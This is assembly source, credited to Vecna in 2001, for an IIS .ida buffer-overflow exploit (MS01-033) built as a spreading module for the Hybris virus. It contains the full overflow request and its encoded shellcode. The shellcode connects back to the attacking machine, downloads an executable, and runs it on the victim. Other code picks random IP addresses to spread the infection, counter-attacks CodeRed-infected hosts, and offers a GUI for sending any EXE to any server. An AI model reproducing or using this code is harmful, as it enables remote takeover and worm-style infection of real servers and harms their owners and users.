;on-demand IIS-xploit+automatic iis retaliator+muazzin for hybris
;(c) Vecna

;/L <filename> -> listen() in port 80, and send filename to who connect there
;/D            -> dump muazzin code to XPLOIT.BIN

.386
.model flat,stdcall
option casemap :none


_TYPE    equ "tlpx"             ;xplt
_VERSION equ  0001h


include d:\masm32\include\windows.inc
include d:\masm32\include\user32.inc
includelib d:\masm32\lib\user32.lib
include d:\masm32\include\kernel32.inc
includelib d:\masm32\lib\kernel32.lib
include d:\masm32\include\comdlg32.inc
includelib d:\masm32\lib\comdlg32.lib
include d:\masm32\include\wsock32.inc
includelib d:\masm32\lib\wsock32.lib


WndProc         PROTO :DWORD,:DWORD,:DWORD,:DWORD
send_iis_xploit PROTO :DWORD,:DWORD,:DWORD
value2decimal   PROTO
start           PROTO


IDC_SERVERIP    EQU 1101
IDC_FILENAME	EQU 1102
IDC_CHOOSEFN	EQU 1103
IDC_ABOUT	EQU 1104
IDC_QUIT        EQU 1105
IDC_CONNECT     EQU 1106


.data
dlgname    db "XPLOIT",0

appname    db "IIS XPLOIT MS01-033 v2",0

copyright  db "Vecna (c) 2001",0

sz_connect db "XPLOIT",0
sz_sending db "Sending...",0

packetsent db "Packet sent!",0
error_mid  db 'Xploit timeout...',0
error_full db 'Cant connect...',0

muazzin_name db 'XPLOIT.BIN',0

help       db "Choose a EXE file...", 0

filters    db "EXE files", 0
           db "*.EXE", 0
           db "All files", 0
           db "*.*", 0
           dd 0

esperando db '-> listen()',13,10,0
conectado db '-> connected... ',0
cr_1      db 'CodeRed original',13,10,0
cr_2      db 'CodeRed2',13,10,0
vec       db 'our exploiter',13,10,0
unk       db 'unknow',13,10,0
sent      db '-> exploit sent!',13,10,13,10,0
sent2     db '-> exploit timeout!',13,10,13,10,0
x_error   db '-> cant connect back!',13,10,13,10,0

.data?
out_hnd   dd ?
hInstance dd ?
hButton1  dd ?
hButton2  dd ?
hButton3  dd ?
hButton4  dd ?
hEdit1    dd ?
hEdit2    dd ?
buffer    db MAX_PATH dup (?)


.code

include \MUAZZIN\MUAZZIN.ASI

muazzin:
       jmp cmd_handler


value2decimal proc
       push ebx
       push edx
       xor edx,edx
       mov ebx,10
       div ebx
       push edx
       or eax,eax
       jz @@skipz
       invoke value2decimal
 @@skipz:
       pop eax
       add al,"0"
       stosb
       pop edx
       pop ebx
       ret
value2decimal endp


init_dll proc
       pushad
       call delta
       xchg ebp,esi

       lea esi,[ebx+api_table]
  @@dll:
       lodsd
       test eax,eax
       jz @@done
       lea edi,[eax+ebx]
       push edi
       call dword ptr [ebp+GMH]
       test eax,eax
       jnz @@loaded
       push edi
       call [ebx+_LoadLibraryA]
  @@loaded:
       mov edi,eax                      ;edi==dll base
       lodsd
       xchg ecx,eax
  @@zz:
       push ecx
       lodsd
       lea ecx,[eax+ebx]
       push ecx
       push edi
       call dword ptr [ebp+GPA]
       test eax,eax
       jz @@zkipz
       mov [esi-4],eax
  @@zkipz:
       pop ecx
       loop @@zz
       jmp @@dll
  @@done:
       popad
       ret
init_dll endp


CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 0FFFFFFFFh

crc    macro   string                          ;jp/lapse macro
.radix 16d
       crcReg = CRC_INIT
       irpc _x, <string>
         ctrlByte = '&_x&' xor (crcReg and 0ff)
         crcReg = crcReg shr 8
         rept 8
           ctrlByte = (ctrlByte shr 1) xor (CRC_POLY * (ctrlByte and 1))
         endm
         crcReg = crcReg xor ctrlByte
       endm
       dd crcReg
.radix 10d
endm

cmp_ecx_crc macro string
       db 081h,0f9h
       crc <string>
endm

xploit:
       db "GET /default.ida?"
       db 224 dup ("V")
       db "%u9090%u6858%ucbd3%u7801"
       db "%u9090%u6858%ucbd3%u7801"
       db "%u9090%u6858%ucbd3%u7801"
       db "%u9090%u9090%u8190%u00c3"
       db "%u0003%u8b00%u531b%u53ff"
       db "%u0078%u0000%u00"
       db "=a  HTTP/1.0",13,10
       db "Content-type: text/xml",10
       db 'Content-length: '
;       db (xploit_code_size/1000) mod 10+'0'
       db (xploit_code_size/ 100) mod 10+'0'
       db (xploit_code_size/  10) mod 10+'0'
       db (xploit_code_size/   1) mod 10+'0'
       db ' ',13,10,13,10

_loadlibrary   equ 0
_freelibrary   equ 4
_createfile    equ 8
_writefile     equ 12
_closehandle   equ 16
_createprocess equ 20
_gettemppath   equ 24
_gettickcount  equ 28
_wait4sobj     equ 32
_deletefile    equ 36
_socket0       equ 40
_connect0      equ 44
_closesocket0  equ 48
_recv0         equ 52
_sleep         equ 56
_globalalloc   equ 60
_globalfree    equ 64
_getstartinfo  equ 68
_ptr           equ 72
_size          equ 76
_ws2_32        equ 80
_startinfo     equ 84
_fname         equ _startinfo+(SIZE _startinfo)
_stack_size    equ _fname+260

xploit_code:
       pushad
       sub esp, _stack_size
       mov edx, 77E00000h-65536
  @@scan:
       add edx, 65536
       cmp edx, 78000000h
       jne @@skip_range
       mov edx, 0BFF00000h
  @@skip_range:
       pushad
       call @@seh
       mov esp, [esp+8]
  @@no_kernel32:
       assume fs:nothing
       pop dword ptr fs:[0]
       pop eax
       popad
       jmp @@scan
  @@seh:
       push dword ptr fs:[0]
       mov fs:[0], esp
       cmp word ptr [edx], "ZM"
       jne @@no_kernel32
       mov eax, [edx+3Ch]
       cmp dword ptr [edx+eax], "EP"
       jne @@no_kernel32
       mov eax, [edx+eax+78h]
       add eax, edx
       mov eax, [eax+0Ch]
       cmp dword ptr [edx+eax], "NREK"
       jne @@no_kernel32
       cmp dword ptr [edx+eax+4], "23LE"
       jne @@no_kernel32
       pop dword ptr fs:[0]
       pop eax
       call import

       call @@wsock
       db 'WS2_32.DLL',0
  @@wsock:
       call dword ptr [esp+_loadlibrary+4]
       test eax,eax
       xchg edx,eax
       mov [esp+_ws2_32],edx
       jz @@exit0
       call import

       sub ebp,ebp
       push 16*1024
  file_size equ $-4
       push dword ptr [esp]
       pop dword ptr [esp+_size+4]
       push 40h
       call dword ptr [esp+_globalalloc+2*4]
       mov [esp+_ptr],eax
       test eax,eax
       jz @@exit

       push IPPROTO_TCP
       push SOCK_STREAM
       push AF_INET
       call dword ptr [esp+_socket0+3*4]
       mov ebx,eax
       inc eax
       jz @@free

       push ebp
       push ebp
       push ebp
       push ebp
       mov eax,esp

       mov word ptr [eax],AF_INET
       mov word ptr [eax+2],5000h
  serv_port equ $-2
       mov dword ptr [eax+4],0100007fh
  serv_address equ $-4

       push 10h
       push eax
       push ebx
       call dword ptr [esp+_connect0+3*4+4*4]
       add esp,4*4
       test eax, eax
       jz @@readfile

  @@closeinet:
       push ebx
       call dword ptr [esp+_closesocket0+4]
       jmp @@free

  @@readfile:
       push ebp
       push dword ptr [esp+_size+4]
       push dword ptr [esp+_ptr+2*4]
       push ebx
       call dword ptr [esp+_recv0+4*4]
       inc eax
       jz @@closeinet

       push ebx
       call dword ptr [esp+_closesocket0+4]

       lea esi, [esp+_fname]
       push esi
       push MAX_PATH
       call dword ptr [esp+_gettemppath+2*4]
       lea edi,[esi+eax]
       call dword ptr [esp+_gettickcount]
       and eax, 0f0f0f0fh
       add eax, "AAAA"
       stosd
       xor eax,esp
       imul eax,eax,CRC_POLY
       and eax,0f0f0f0fh
       add eax,"ZZZZ"-0f0f0f0fh
       stosd
       mov eax,"EXE."
       stosd
       mov eax,ebp
       stosb

       push ebp
       push 80h
       push 2
       push ebp
       push ebp
       push 40000000h
       push esi
       call dword ptr [esp+_createfile+7*4]
       mov ebx, eax
       inc eax
       jz @@free

       push ebp
       mov eax,esp
       push ebp
       push eax
       push dword ptr [esp+_size+3*4]
       push dword ptr [esp+_ptr+4*4]
       push ebx
       call dword ptr [esp+_writefile+6*4]

       mov [esp],ebx
       call dword ptr [esp+_closehandle+4]

       lea ecx,[esp+_startinfo]

       push ebp
       push ebp
       push ebp
       push ebp
       mov eax, esp

       push eax
       push ecx

       push ecx
       call dword ptr [esp+_getstartinfo+7*4]

       push ebp
       push ebp
       push NORMAL_PRIORITY_CLASS
       push ebp
       push ebp
       push ebp
       push ebp
       push esi
       call dword ptr [esp+_createprocess+14*4]
       pop ecx
       add esp,3*4
       test eax,eax
       jz @@kill666

       push -1
       push ecx
       call dword ptr [esp+_wait4sobj+2*4]

  @@kill666:
       push esi
       call dword ptr [esp+_deletefile+4]

  @@free:
       push dword ptr [esp+_ptr]
       call dword ptr [esp+_globalfree+4]

  @@exit:
       push dword ptr [esp+_ws2_32]
       call dword ptr [esp+_freelibrary+4]

  @@exit0:
       push -1
       call dword ptr [esp+_sleep+4]


import:
       mov eax, [edx+3ch]
       add eax, edx
       mov esi, [eax+120]
       lea esi, [esi+edx+24]
       lodsd
       push eax
       lodsd
       push eax
       lodsd
       xchg ebx, eax
       pop ebp
       pop ecx
       lodsd
       xchg esi, eax
       xchg esi, ebx
       neg edx
       sub esi, edx
       sub ebp, edx
       sub ebx, edx
       sub edi, edi
  @@loopy:
       inc edi
       lodsd
       pusha
       sub eax, edx
       xchg eax, esi
       mov ecx, CRC_INIT
  @@next_byte:
       lodsb
       test al, al
       jz @@done333
       xor cl, al
       mov al, 8
  @@next_bit:
       shr ecx, 1
       jnc @@poly
       xor ecx, CRC_POLY
  @@poly:
       dec al
       jnz @@next_bit
       jmp @@next_byte
  @@done333:
       sub eax, eax
       cmp_ecx_crc <LoadLibraryA>
       je @@patch_api
       inc eax
       cmp_ecx_crc <FreeLibrary>
       je @@patch_api
       inc eax
       cmp_ecx_crc <CreateFileA>
       je @@patch_api
       inc eax
       cmp_ecx_crc <WriteFile>
       je @@patch_api
       inc eax
       cmp_ecx_crc <CloseHandle>
       je @@patch_api
       inc eax
       cmp_ecx_crc <CreateProcessA>
       je @@patch_api
       inc eax
       cmp_ecx_crc <GetTempPathA>
       je @@patch_api
       inc eax
       cmp_ecx_crc <GetTickCount>
       je @@patch_api
       inc eax
       cmp_ecx_crc <WaitForSingleObject>
       je @@patch_api
       inc eax
       cmp_ecx_crc <DeleteFileA>
       je @@patch_api
       inc eax
       cmp_ecx_crc <socket>
       je @@patch_api
       inc eax
       cmp_ecx_crc <connect>
       je @@patch_api
       inc eax
       cmp_ecx_crc <closesocket>
       je @@patch_api
       inc eax
       cmp_ecx_crc <recv>
       je @@patch_api
       inc eax
       cmp_ecx_crc <Sleep>
       je @@patch_api
       inc eax
       cmp_ecx_crc <GlobalAlloc>
       je @@patch_api
       inc eax
       cmp_ecx_crc <GlobalFree>
       je @@patch_api
       inc eax
       cmp_ecx_crc <GetStartupInfoA>
       jne @@end_loopy
  @@patch_api:
       lea esi, [esp+(8*4)+eax*4+_loadlibrary+4]
       dec edi
       movzx eax, word ptr [ebx+(edi*2)]
       mov eax, [ebp+(eax*4)]
       sub eax, edx
       mov [esi], eax
  @@end_loopy:
       popa
       dec ecx
       jnz @@loopy
       ret

xploit_code_size equ $-xploit_code
xploit_size      equ $-xploit

cmd_handler:
       mov esi, [esp+4]
       test dword ptr [esi+m_why], MT_APP
       jnz init_system
       test dword ptr [esi+m_why], MT_BLOCKIP
       jnz activate_thread
       test dword ptr [esi+m_why], MT_QUERY
       jnz @@query
  exit:
       mov dword ptr [esi+m_result], MR_DONE
       ret 4
  @@query:
       mov esi, MT_QUERY+MT_APP+MT_BLOCKIP
       mov ebx, _TYPE
       mov ecx, _VERSION
       mov eax, MR_DONE
       ret 4

init_system proc
       pushad
       call init_dll
       call delta

       mov eax,[esi+m_droppersize]
       mov [ebx+dropper_size],eax
       lea edi,[eax+muazzin_size]

       call @@xploit
mapname db 'HIISBRYXPLOITS',0
  @@xploit:
       push NULL
       push FILE_MAP_ALL_ACCESS
       call [ebx+_OpenFileMappingA]
       test eax, eax
       jnz @@installed

       lea eax,[ebx+mapname]
       push eax
       push edi
       push 0
       push PAGE_READWRITE
       push 0
       push -1
       call [ebx+_CreateFileMappingA]
       test eax, eax
       jz @@installed

       push 0
       push 0
       push 0
       push FILE_MAP_ALL_ACCESS
       push eax
       call [ebx+_MapViewOfFile]
       test eax,eax
       jz @@installed
       mov edi,eax

       mov edx,esi
       lea esi,[ebx+muazzin]
       mov ecx,muazzin_size
       rep movsb
       mov esi,[edx+m_dropper]
       mov ecx,[edx+m_droppersize]
       rep movsb

       add eax,(offset rnd_ip_gen-offset muazzin)
       push NULL
       push esp
       push NULL
       push NULL
       push eax
       push NULL
       push NULL
       call [ebx+_CreateThread]
       pop eax
  @@installed:
       popad
       jmp exit
init_system endp


activate_thread proc
       pushad
       call init_dll
       call delta

       lea eax,[ebx+mapname]
       push eax
       push NULL
       push FILE_MAP_ALL_ACCESS
       call [ebx+_OpenFileMappingA]
       test eax, eax
       jz @@exit666

       push 0
       push 0
       push 0
       push FILE_MAP_ALL_ACCESS
       push eax
       call [ebx+_MapViewOfFile]
       test eax, eax
       jz @@exit666

       add eax,(offset iis_exploit-offset muazzin)
       push NULL
       push esp
       push NULL
       push dword ptr [esi+m_ip]
       push eax
       push NULL
       push NULL
       call [ebx+_CreateThread]
       pop eax

  @@exit666:
       popad
       mov dword ptr [esi+m_result], MR_OK
       ret 4
activate_thread endp


rnd_ip_gen proc shit:DWORD
  LOCAL counter:DWORD
       pushad
       call delta

       call [ebx+_GetTickCount]
       mov [ebx+randseed],eax

       call get_this_ip
       mov [ebx+this_ip],eax

       mov [counter],-16*1024
  @@another:
       call get_ip
       push edx
       call iis_exploit
       inc [counter]
       jnz @@another
  @@rnd_ip:
       call [ebx+_GetTickCount]
       mov [ebx+this_ip],eax
       mov [counter],-4*1024
       jmp @@another
;       popad
;       ret
rnd_ip_gen endp


random_eax proc
       mov eax, [ebx+randseed]
       imul eax, 8088405h
       inc eax
       mov [ebx+randseed], eax
       lea eax, [eax+esp+12345678h]
  randseed equ $-4
       neg eax
       rol eax, 8
       ret
random_eax endp


random_ip_byte proc
       call random_eax
       cmp al,255
       je random_ip_byte
       test al,al
       je random_ip_byte
       ret
random_ip_byte endp


get_ip proc
       call random_ip_byte
       mov dh, al          ; d
       call random_ip_byte
       mov dl, al          ; c
       shl edx, 16
       call random_ip_byte
       mov dh, al          ; b
       call random_ip_byte
       mov dl, al          ; a
       call random_eax
       and  eax, 7
       call @@poptbl
;  DDCCBBAA
dd 0FFFFFFFFh  ;0     *.*.*.*   X=local
dd 0FFFFFF00h  ;1               *=random
dd 0FFFFFF00h  ;2     X.*.*.*
dd 0FFFFFF00h  ;3
dd 0FFFFFF00h  ;4
dd 0FFFF0000h  ;5     X.X.*.*
dd 0FFFF0000h  ;6
dd 0FFFF0000h  ;7
  @@poptbl:
       pop ecx
       mov eax, [ecx+eax*4]
       and edx, eax
       not eax
       and eax, 12345678h
  this_ip equ $-4
       or edx, eax
       cmp dl, 127
       je get_ip
       cmp dl, 224
       je get_ip
       cmp edx, [ebx+this_ip]
       je get_ip
       ret
get_ip endp


delta proc
       call @@delta
  @@delta:
       pop ebx
       sub ebx, offset @@delta
       ret
delta endp


iis_exploit proc ip:DWORD
       pushad
       call delta
       lea eax,[ebx+muazzin_end]
       push dword ptr [ip]
       push 12345678h
  dropper_size equ $-4
       push eax
       call send_iis_xploit
       popad
       ret
iis_exploit endp


get_this_ip proc
  LOCAL temp[MAX_PATH]:BYTE
       pushad

       lea esi, temp
       push MAX_PATH
       push esi
       call [ebx+_gethostname]
       test eax,eax
       jnz @@done666

       push esi
       call [ebx+_gethostbyname]
       test eax,eax
       jnz @@done666

       mov eax,[eax+16]
       mov eax,[eax]
       mov [esp+7*4],eax

  @@done666:
       popad
       ret
get_this_ip endp


send_iis_xploit proc send_buffer:DWORD,send_size:DWORD,ip:DWORD
  LOCAL socket666:DWORD
  LOCAL mainsocket:sockaddr_in
       pushad
       call delta

       mov dword ptr [esp+7*4],0

       mov eax,[send_size]
       mov [ebx+file_size],eax

       mov eax,[send_buffer]
       mov dword ptr [ebx+file_buffer],eax

       call get_this_ip
       mov dword ptr [ebx+serv_address],eax

       call [ebx+_GetTickCount]
       and eax, 0fffh
       add ax,50000
       xchg al,ah
       mov word ptr [ebx+serv_port],ax

       push IPPROTO_TCP
       push SOCK_STREAM
       push AF_INET
       call dword ptr [ebx+_socket]
       mov socket666,eax
       inc eax
       jz @@error

       mov eax,[ip]
       mov mainsocket.sin_addr,eax
       mov mainsocket.sin_family,AF_INET
       mov mainsocket.sin_port,5000h
       mov dword ptr mainsocket.sin_zero,NULL
       mov dword ptr mainsocket.sin_zero+4,NULL
       push SIZE sockaddr_in
       lea eax,mainsocket
       push eax
       push socket666
       call dword ptr [ebx+_connect]
       test eax,eax
       jnz @@close

       push eax
       lea eax,[ebx+ftp_thread]
       push esp
       push NULL
       push dword ptr [ebx+serv_port]
       push eax
       push NULL
       push NULL
       call [ebx+_CreateThread]
       mov edi,eax
       inc eax
       pop eax
       jz @@close

       push NULL
       push xploit_size
       push offset xploit
       push [socket666]
       call [ebx+_send]
       inc eax
       jz @@kill

       mov dword ptr [esp+7*4],1
       push 30*1000
       push edi
       call [ebx+_WaitForSingleObject]
       cmp eax, WAIT_OBJECT_0
       je @@close

  @@kill:
       mov dword ptr [esp+7*4],2
       push 0
       push edi
       call [ebx+_TerminateThread]

  @@close:
       push socket666
       call dword ptr [ebx+_closesocket]

  @@error:
       popad
       ret
send_iis_xploit endp


ftp_thread proc wait_port:DWORD
 LOCAL my_socket:DWORD
 LOCAL my_socket2:DWORD
       pushad
       call delta

       push IPPROTO_TCP
       push SOCK_STREAM
       push AF_INET
       call dword ptr [ebx+_socket]
       mov my_socket,eax
       inc eax
       jz @@error

       push 0
       push 0
       push 0
       mov eax,[wait_port]
       shl eax,16
       mov ax,AF_INET
       push eax
       mov eax,esp

       push SIZE sockaddr_in
       push eax
       push my_socket
       call dword ptr [ebx+_bind]
       add esp,SIZE sockaddr_in
       test eax,eax
       jnz @@done

       push 3
       push my_socket
       call dword ptr [ebx+_listen]
       test eax,eax
       jnz @@done

       push 0
       push 0
       push my_socket
       call dword ptr [ebx+_accept]
       mov my_socket2,eax
       inc eax
       jz @@done

       push 0
       push dword ptr [ebx+file_size]
       push 12345678h
  file_buffer equ $-4
       push my_socket2
       call dword ptr [ebx+_send]

       push [my_socket2]
       call dword ptr [ebx+_closesocket]

       push [my_socket]
       call dword ptr [ebx+_closesocket]
       jmp @@alldone

  @@done:
       push [my_socket]
       call dword ptr [ebx+_closesocket]

  @@error:
       push -1
       call dword ptr [ebx+_Sleep]

  @@alldone:
       popad
       ret
ftp_thread endp



kernel32dll db 'KERNEL32.DLL',0

__CreateThread db 'CreateThread',0
__GetTickCount db 'GetTickCount',0
__LoadLibraryA db 'LoadLibraryA',0
__CreateFileMappingA db 'CreateFileMappingA',0
__OpenFileMappingA db 'OpenFileMappingA',0
__MapViewOfFile db 'MapViewOfFile',0
__TerminateThread db 'TerminateThread',0
__Sleep db 'Sleep',0
__WaitForSingleObject db 'WaitForSingleObject',0

wsock32dll db 'WSOCK32.DLL',0
__socket   db 'socket',0
__send     db 'send',0
__recv     db 'recv',0
__listen   db 'listen',0
__accept   db 'accept',0
__closesocket db 'closesocket',0
__inet_ntoa db 'inet_ntoa',0
__gethostname db 'gethostname',0
__gethostbyname db 'gethostbyname',0
__bind     db 'bind',0
__connect  db 'connect',0


api_table:
dd offset kernel32dll
dd 9
_CreateThread dd offset __CreateThread
_GetTickCount dd offset __GetTickCount
_LoadLibraryA dd offset __LoadLibraryA
_CreateFileMappingA dd offset __CreateFileMappingA
_OpenFileMappingA dd offset __OpenFileMappingA
_MapViewOfFile dd offset __MapViewOfFile
_TerminateThread dd offset __TerminateThread
_Sleep dd offset __Sleep
_WaitForSingleObject dd offset __WaitForSingleObject

dd offset wsock32dll
dd 11
_socket  dd offset __socket
_send    dd offset __send
_recv    dd offset __recv
_listen  dd offset __listen
_accept  dd offset __accept
_closesocket dd offset __closesocket
_inet_ntoa dd offset __inet_ntoa
_gethostname dd offset __gethostname
_gethostbyname dd offset __gethostbyname
_bind    dd offset __bind
_connect dd offset __connect

dd 0                    ;NULL ENTRY

muazzin_end:

muazzin_size equ $-muazzin


start  proc
  LOCAL tmp:DWORD
  LOCAL socket0:DWORD
  LOCAL socket1:DWORD
  LOCAL _wsadata:WSADATA
  LOCAL host:sockaddr_in
       invoke GetCommandLineA
       mov esi, eax
  @@cmdline:
       lodsb
       cmp al,'-'
       je @@option
       cmp al,'/'
       jne @@check
  @@option:
       mov al,[esi]
       or al,20h
       cmp al,'d'
       je @@dump
       cmp al,'l'
       jne @@check
  @@retaliate:
       inc esi
       cmp byte ptr [esi],0
       je @@done
       cmp byte ptr [esi],20h
       je @@retaliate

       call muazzin_startup

       invoke AllocConsole
       invoke GetStdHandle,STD_OUTPUT_HANDLE
       mov [out_hnd],eax

       invoke WSAStartup,0101h,ADDR _wsadata

       invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
       mov socket0,eax
       inc eax
       jz @@done666

       mov host.sin_addr,0
       mov host.sin_family,AF_INET
       mov host.sin_port,5000h
       mov dword ptr host.sin_zero,NULL
       mov dword ptr host.sin_zero+4,NULL
       invoke bind,socket0,ADDR host,SIZE sockaddr_in
       test eax,eax
       jnz @@done666

       invoke listen,socket0,3
       test eax,eax
       jnz @@done666

       push offset esperando
       call saida

  @@incomming_connection:
       mov [tmp],SIZE sockaddr_in
       invoke accept,socket0,ADDR host,ADDR tmp
       mov socket1,eax
       inc eax
       jz @@incomming_connection

       push offset conectado
       call saida

       invoke GlobalAlloc,40h,16*1024
       mov ebx,eax
       invoke recv,socket1,ebx,16*1024,0

       push dword ptr [ebx+200]
       invoke GlobalFree,ebx

       pop eax
       cmp eax, 'VVVV'
       jnz @@vvvv
       push offset vec
       call saida
       jmp @@oneofours
  @@vvvv:
       cmp eax,'NNNN'
       jne @@nnnn
       push offset cr_1
       jmp @@attack666
  @@nnnn:
       cmp eax,'XXXX'
       jne @@xxxx
       push offset cr_2
       jmp @@attack666
  @@xxxx:
       push offset unk
  @@attack666:
       call saida
  @@attack:
       mov eax,[host.sin_addr]
       mov edx,esi
       call send_filename

       lea edi,sent
       cmp eax,1
       je @@printit
       lea edi,sent2
       cmp eax,2
       je @@printit
       lea edi,x_error

  @@printit:
       invoke MessageBeep,-1
       push edi
       call saida

  @@oneofours:
       invoke closesocket,socket1

       jmp @@incomming_connection

  @@done666:
       invoke closesocket,socket0

       invoke FreeConsole

       invoke WSACleanup
       jmp @@done

  @@dump:
       invoke CreateFileA,ADDR muazzin_name,GENERIC_WRITE,NULL,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
       mov ebx,eax
       inc eax
       jz @@done
       invoke WriteFile,ebx,ADDR muazzin,muazzin_size,ADDR tmp,NULL
       invoke CloseHandle,ebx
       jmp @@done

  @@check:
       test al,al
       jnz @@cmdline

       invoke GetModuleHandle,NULL
       mov hInstance,eax
       invoke DialogBoxParam,hInstance,ADDR dlgname,NULL,ADDR WndProc,NULL
  @@done:
       invoke ExitProcess,eax
start  endp


saida proc ptr2str:DWORD
  LOCAL tmp:DWORD
       pushad
       invoke lstrlenA,[ptr2str]
       mov ecx,eax
       invoke WriteConsole,[out_hnd],[ptr2str],ecx,ADDR tmp,0
       popad
       ret
saida endp


WndProc proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
   LOCAL openfn:OPENFILENAMEA
       pushad
     .if uMsg == WM_COMMAND
       .if wParam == IDC_QUIT
             jmp @@end_shit
       .elseif wParam == IDC_CONNECT
             invoke SendMessage,hButton1,WM_SETTEXT,NULL,ADDR sz_sending
             invoke EnableWindow,hButton1,FALSE
             invoke EnableWindow,hButton2,FALSE
             invoke EnableWindow,hButton3,FALSE
             invoke EnableWindow,hButton4,FALSE
             invoke SendMessage,hEdit1,WM_ENABLE,FALSE,NULL
             invoke SendMessage,hEdit2,WM_ENABLE,FALSE,NULL
             invoke EnableWindow,hEdit1,FALSE
             invoke EnableWindow,hEdit2,FALSE
             invoke SendMessage,hEdit1,WM_GETTEXT,MAX_PATH,ADDR buffer
             invoke inet_addr,ADDR buffer
             cmp eax,INADDR_NONE
             jne @@isip
             invoke gethostbyname,ADDR buffer
             test eax,eax
             jz @@done
             mov eax,[eax+hostent.h_list]
             mov eax,[eax]
             mov eax,[eax]
       @@isip:
             mov edi,eax                ;edi==IP
             invoke SendMessage,hEdit2,WM_GETTEXT,MAX_PATH,ADDR buffer

             call exe_exploit

             lea edx,packetsent
             cmp eax,1
             je @@done3
             lea edx,error_mid
             cmp eax,2
             je @@done3
             lea edx,error_full
        @@done3:
             invoke MessageBoxA,hWin,edx,ADDR appname,MB_OK
        @@done:
             invoke SendMessage,hButton1,WM_SETTEXT,NULL,ADDR sz_connect
             invoke EnableWindow,hButton1,TRUE
             invoke EnableWindow,hButton2,TRUE
             invoke EnableWindow,hButton3,TRUE
             invoke EnableWindow,hButton4,TRUE
             invoke EnableWindow,hEdit1,TRUE
             invoke EnableWindow,hEdit2,TRUE
             invoke SendMessage,hEdit1,WM_ENABLE,TRUE,NULL
             invoke SendMessage,hEdit2,WM_ENABLE,TRUE,NULL
       .elseif wParam == IDC_ABOUT
             invoke MessageBoxA,hWin,ADDR copyright,ADDR appname,MB_OK
       .elseif wParam == IDC_CHOOSEFN
             lea esi, openfn
             mov edi, esi
             mov ecx, SIZEOF OPENFILENAMEA
             sub eax, eax
             mov dword ptr [buffer], eax
             rep stosb
             mov openfn.lStructSize, SIZEOF OPENFILENAMEA
             mov openfn.lpstrFilter, offset filters
             mov openfn.lpstrFile, offset buffer
             mov openfn.nMaxFile, MAX_PATH
             mov openfn.lpstrTitle, offset help
             mov openfn.Flags, OFN_FILEMUSTEXIST+OFN_HIDEREADONLY+OFN_LONGNAMES
             invoke GetOpenFileNameA, esi
             test eax, eax
             jz @@aborted
             invoke SendMessage,hEdit2,WM_SETTEXT,NULL,ADDR buffer
       @@aborted:
       .endif
     .elseif uMsg == WM_INITDIALOG
             call muazzin_startup

             invoke WSAStartup,101h,ADDR buffer
             invoke GetDlgItem,hWin,IDC_CONNECT
             mov hButton1,eax
             invoke GetDlgItem,hWin,IDC_CHOOSEFN
             mov hButton2,eax
             invoke GetDlgItem,hWin,IDC_QUIT
             mov hButton3,eax
             invoke GetDlgItem,hWin,IDC_ABOUT
             mov hButton4,eax
             invoke GetDlgItem,hWin,IDC_SERVERIP
             mov hEdit1,eax
             invoke GetDlgItem,hWin,IDC_FILENAME
             mov hEdit2,eax
             invoke SendMessage,hButton1,WM_SETTEXT,NULL,ADDR sz_connect
     .elseif uMsg == WM_CLOSE
        @@end_shit:
             invoke WSACleanup
             invoke EndDialog,hWin,NULL
     .endif
       popad
       xor eax,eax
       ret
WndProc endp


;eax==IP
;edx==filename
send_filename proc
        pushad
        mov dword ptr [esp+7*4],0
        push eax
        lea edi,buffer
        mov esi,edx
  @@cpy:
        lodsb
        stosb
        test al,al
        jnz @@cpy
        pop edi
        call exe_exploit
        mov [esp+7*4],eax
        popad
        ret
send_filename endp


exe_exploit proc
   LOCAL exe_size:DWORD
        pushad
        mov dword ptr [esp+7*4],0
        invoke CreateFileA,ADDR buffer,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
        mov ebx,eax
        inc eax
        jz @@done

        invoke GetFileSize,ebx,NULL
        mov esi,eax
        invoke GlobalAlloc,GMEM_FIXED,eax
        push eax
        mov ecx,eax
        invoke ReadFile,ebx,ecx,esi,ADDR exe_size,NULL
        invoke CloseHandle,ebx
        pop ebx

        push edi
        push esi
        push ebx
        call send_iis_xploit
        mov [esp+7*4],eax

        invoke GlobalFree,ebx
  @@done:
        popad
        ret
exe_exploit endp


muazzin_startup proc
       pushad
       lea eax,[GetProcAddress]
       push eax
       lea eax,[GetModuleHandleA]
       push eax
       push 0
       push 0
       push 0
       mov esi,esp
       call init_dll
       add esp,size_muazzin_struc
       popad
       ret
muazzin_startup endp


end    start
